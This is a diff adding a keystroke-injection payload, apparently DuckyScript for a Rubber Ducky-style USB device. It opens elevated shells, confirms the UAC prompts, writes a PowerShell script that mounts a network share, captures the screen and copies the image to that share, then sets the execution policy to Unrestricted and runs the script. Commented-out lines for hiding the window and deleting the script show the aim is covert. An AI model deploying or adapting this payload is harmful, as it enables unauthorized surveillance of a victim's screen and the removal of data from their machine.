@@ -1,0 +1,120 @@
+DELAY 750
+GUI r
+DELAY 1000
+STRING powershell Start-Process cmd -Verb runAs 
+ENTER
+DELAY 750
+ALT y 
+DELAY 1000 
+STRING IF NOT EXIST C:\Temp mkdir C:\Temp
+ENTER
+DELAY 750
+STRING exit
+ENTER
+DELAY 750
+GUI r
+DELAY 1000
+STRING powershell Start-Process notepad -Verb runAs
+ENTER
+DELAY 750
+ALT y
+DELAY 750
+REM ENTER
+REM ALT SPACE
+DELAY 1000
+REM STRING m
+DELAY 1000
+REM DOWNARROW
+REM REPEAT 100
+STRING $nasUserName = ""
+ENTER
+STRING $nasPassword = ""
+ENTER
+STRING $imagePath = ""
+ENTER
+STRING $fileNames = @()
+ENTER
+STRING $userDir = (Get-ChildItem env:\userprofile).value 
+ENTER
+STRING $computerName = whoami
+ENTER
+STRING $shortName = ($computerName.split('\'))[0]
+ENTER
+STRING function startNas{ 
+ENTER
+STRING net use P: \\$imagePath /user:$nasUserName $nasPassword 
+ENTER
+STRING $script:buildPath = "P:"}
+ENTER
+STRING function stopNas{ 
+ENTER
+STRING net use P: /delete /YES}
+ENTER
+STRING function getScreen(){ 
+ENTER
+STRING . "C:\Temp\Take-ScreenShot.ps1" 
+ENTER 
+STRING $uniqueId = [guid]::NewGuid() 
+ENTER
+STRING $script:imageName = "$script:shortName$uniqueId.png" 
+ENTER
+STRING $params = "$script:imageName" 
+ENTER
+STRING Take-ScreenShot -screen -file $params -imagetype png}
+ENTER
+STRING function getScript(){ 
+ENTER
+STRING Copy-Item P:\Take-ScreenShot.ps1 C:\Temp }
+ENTER
+STRING function copyScreenToNas(){	
+ENTER
+STRING Copy-Item $script:imageName P:\images }
+ENTER
+STRING function main(){ 
+ENTER
+STRING startNas 
+ENTER
+STRING getScript 
+ENTER
+STRING getScreen 
+ENTER
+STRING copyScreenToNas 
+ENTER
+STRING stopNas 
+ENTER
+STRING }
+ENTER
+STRING main
+ENTER
+REM STRING Remove-Item $MyINvocation.InvocationName
+ENTER
+CTRL s
+DELAY 1000
+STRING C:\Temp\screenShot.ps1
+ENTER
+DELAY 1000
+ALT F4 
+DELAY 750
+GUI r 
+DELAY 1000
+STRING powershell Start-Process cmd -Verb runAs 
+ENTER
+DELAY 750  
+ALT y 
+DELAY 750  
+REM STRING mode con:cols=14 lines=1 
+REM ENTER
+REM ALT SPACE 
+DELAY 1000
+REM STRING m 
+DELAY 1000
+REM DOWNARROW 
+REM REPEAT 100
+REM ENTER
+STRING powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false 
+REM in a nice environment this should be set back
+ENTER 
+DELAY 750  
+REM STRING powershell.exe -windowstyle hidden -File C:\Temp\screenShot.ps1
+STRING powershell.exe  -File C:\Temp\screenShot.ps1
+ENTER
